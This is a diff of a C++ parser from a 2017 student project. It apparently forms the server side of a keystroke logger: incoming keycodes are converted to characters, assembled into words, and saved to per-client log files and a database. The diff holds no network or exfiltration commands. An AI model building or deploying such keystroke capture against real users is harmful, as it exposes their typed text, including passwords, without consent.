@@ -5,7 +5,7 @@
 // Login   <adrien.bachelet@epitech.eu>
 // 
 // Started on  Fri Oct  6 15:25:10 2017 Adrien Bachelet
-// Last update Sat Oct  7 23:52:28 2017 Adrien Bachelet
+// Last update Sun Oct  8 19:54:00 2017 Adrien Bachelet
 //
 
 #include	"Parser.hpp"
@@ -22,7 +22,7 @@ Parser::~Parser()
 {
 }
 
-void Parser::parseInput(std::string input)
+void Parser::parseInput(const std::string &input)
 {
   std::string		ret;
   std::string		line;
@@ -40,9 +40,6 @@ void Parser::parseInput(std::string input)
 	      option func = keywords[subs];
 	      ret = (this->*func)(&cmd);
 	    }
-	  else
-	    ret = "ERRRRRRRRRRRROOOOOOOOOOORRRRRRRRRRRRRR";
-	  std::cout << "Log = " << ret << std::endl;
 	}
     }
 }
@@ -79,7 +76,19 @@ std::string	Parser::keyboard(std::istringstream *input)
       if (this->check_num(token))
 	{
 	  if (keys == "" && token != "")
-	    keys = token;
+	    {
+	      unsigned long res = std::stoul(token, NULL, 10);	      
+	      std::wstring_convert<std::codecvt_utf8<char32_t>, char32_t> convert;
+	      keys = convert.to_bytes(res);
+	      word = word + keys;
+	      res = std::stoul(std::string("32"), NULL, 10);
+	      if (this->checkSeparator(keys) && word != "")
+		{
+		  this->writeInFile(this->id + ".log", "LOGWORD = " + this->word);
+      this->db.insertDoc(this->id, this->word);
+		  word.clear();
+		}
+	    }
 	  else if (*input)
 	    keys = keys + " " + token;
 	}
@@ -125,7 +134,15 @@ std::string	Parser::ok(std::istringstream *input)
   return ("OK\r\n");
 }
 
-bool		Parser::check_num(std::string str)
+bool		Parser::checkSeparator(const std::string &keys)
+{
+  std::wstring_convert<std::codecvt_utf8<char32_t>, char32_t> convert;
+  if (keys == convert.to_bytes(32) || keys == convert.to_bytes(13) || keys == convert.to_bytes(9))
+    return (true);
+  return (false);
+}
+
+bool		Parser::check_num(const std::string &str)
 {
   unsigned int	it = 0;
 
@@ -137,15 +154,15 @@ bool		Parser::check_num(std::string str)
   return (true);
 }
 
-bool		Parser::writeInFile(std::string const file, std::string data)
+bool		Parser::writeInFile(const std::string &file, std::string data)
 {
-  if (this->created == false)
-    save.open(file.c_str(), std::ios::app);
-  this->created = true;
-  if(save)
+  std::ofstream	saveLog(file, std::ios::app);
+
+  data = data.substr(0, data.find('\r'));
+  if (saveLog.is_open())
     {
-      save << data << std::endl;
-      save.close();
+      std::cout << data << std::endl;
+      saveLog << data << '\n';
     }
   else
     return (false);
